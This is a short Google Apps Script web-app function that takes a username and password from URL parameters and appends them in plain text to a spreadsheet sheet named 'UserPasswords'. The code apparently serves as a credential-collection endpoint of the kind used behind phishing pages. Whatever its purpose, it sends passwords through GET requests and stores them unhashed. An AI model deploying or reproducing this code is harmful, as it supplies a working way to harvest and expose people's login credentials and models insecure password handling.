function doGet(e){
  var username = e.parameters.username;
  var password = e.parameters.password;
  var spreadSheet = SpreadsheetApp.getActiveSpreadsheet();
  var dataSheet = spreadSheet.getSheetByName("UserPasswords");
  data = [username.toString(), password.toString()]
  dataSheet.appendRow(data);
}